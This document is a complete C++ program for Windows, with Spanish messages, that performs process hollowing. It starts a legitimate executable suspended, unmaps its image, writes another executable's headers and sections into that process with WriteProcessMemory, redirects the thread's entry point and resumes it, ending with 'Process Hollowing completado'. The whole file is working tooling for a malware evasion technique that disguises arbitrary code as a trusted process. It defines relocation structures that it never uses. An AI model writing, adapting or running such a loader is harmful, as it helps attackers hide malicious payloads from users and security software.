#include <windows.h>
#include <iostream>
#include <string>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

void ErrorExit(const char* message) {
    std::cerr << message << " Error: " << GetLastError() << std::endl;
    exit(1);
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "Uso: " << argv[0] << " <proceso_legítimo> <proceso_a_inyectar>" << std::endl;
        std::cout << "Ejemplo: " << argv[0] << " C:\\Windows\\System32\\notepad.exe C:\\ruta\\a\\mi_app.exe" << std::endl;
        return 1;
    }

    std::string targetProcess = argv[1];
    std::string sourceProcess = argv[2];

    HANDLE sourceFile = CreateFileA(sourceProcess.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (sourceFile == INVALID_HANDLE_VALUE) {
        ErrorExit("No se pudo abrir el archivo de origen");
    }

    DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
    LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), 0, sourceFileSize);

    DWORD bytesRead = 0;
    if (!ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, &bytesRead, NULL)) {
        ErrorExit("No se pudo leer el archivo de origen");
    }

    CloseHandle(sourceFile);

    PIMAGE_DOS_HEADER sourceImageDOSHeader = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
    PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)sourceFileBytesBuffer + sourceImageDOSHeader->e_lfanew);

    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    ZeroMemory(&processInfo, sizeof(processInfo));
    startupInfo.cb = sizeof(startupInfo);

    if (!CreateProcessA(
        targetProcess.c_str(),
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &startupInfo,
        &processInfo
    )) {
        ErrorExit("No se pudo crear el proceso legítimo");
    }

    LPVOID imageBaseAddress = NULL;

    MODULEINFO moduleInfo;
    HMODULE hModule;
    DWORD cbNeeded;

    if (EnumProcessModules(processInfo.hProcess, &hModule, sizeof(hModule), &cbNeeded)) {
        if (GetModuleInformation(processInfo.hProcess, hModule, &moduleInfo, sizeof(moduleInfo))) {
            imageBaseAddress = moduleInfo.lpBaseOfDll;
        }
        else {
            ErrorExit("GetModuleInformation falló");
        }
    }
    else {
        ErrorExit("EnumProcessModules falló");
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        ErrorExit("No se pudo obtener el handle de ntdll.dll");
    }

    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
        hNtdll,
        "NtUnmapViewOfSection"
    );

    if (!NtUnmapViewOfSection) {
        ErrorExit("No se pudo obtener la dirección de NtUnmapViewOfSection");
    }

    NTSTATUS status = NtUnmapViewOfSection(
        processInfo.hProcess,
        imageBaseAddress
    );

    if (status != 0) {
        if (!VirtualFreeEx(
            processInfo.hProcess,
            imageBaseAddress,
            0,
            MEM_RELEASE
        )) {
            std::cout << "VirtualFreeEx también falló, continuando..." << std::endl;
        }
    }

    LPVOID newBaseAddress = VirtualAllocEx(
        processInfo.hProcess,
        (LPVOID)(sourceImageNTHeaders->OptionalHeader.ImageBase),
        sourceImageNTHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!newBaseAddress) {
        newBaseAddress = VirtualAllocEx(
            processInfo.hProcess,
            NULL,
            sourceImageNTHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!newBaseAddress) {
            ErrorExit("No se pudo asignar memoria en el proceso legítimo");
        }
    }

    if (!WriteProcessMemory(
        processInfo.hProcess,
        newBaseAddress,
        sourceFileBytesBuffer,
        sourceImageNTHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    )) {
        ErrorExit("No se pudieron escribir los encabezados PE");
    }

    PIMAGE_SECTION_HEADER sourceImageSectionHeader = (PIMAGE_SECTION_HEADER)(
        (DWORD_PTR)sourceImageNTHeaders + sizeof(IMAGE_NT_HEADERS)
        );

    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID sectionDestination = (LPVOID)(
            (DWORD_PTR)newBaseAddress + sourceImageSectionHeader->VirtualAddress
            );

        LPVOID sectionSource = (LPVOID)(
            (DWORD_PTR)sourceFileBytesBuffer + sourceImageSectionHeader->PointerToRawData
            );

        if (!WriteProcessMemory(
            processInfo.hProcess,
            sectionDestination,
            sectionSource,
            sourceImageSectionHeader->SizeOfRawData,
            NULL
        )) {
            ErrorExit("No se pudo escribir una sección del PE");
        }

        sourceImageSectionHeader++;
    }

    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(processInfo.hThread, &context)) {
        ErrorExit("No se pudo obtener el contexto del hilo");
    }

#ifdef _WIN64
    context.Rcx = (DWORD_PTR)newBaseAddress + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
#else
    context.Eax = (DWORD_PTR)newBaseAddress + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

    if (!SetThreadContext(processInfo.hThread, &context)) {
        ErrorExit("No se pudo establecer el contexto del hilo");
    }

    if (ResumeThread(processInfo.hThread) == -1) {
        ErrorExit("No se pudo reanudar el hilo");
    }

    HeapFree(GetProcessHeap(), 0, sourceFileBytesBuffer);
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    std::cout << "Process Hollowing completado." << std::endl;

    return 0;
}
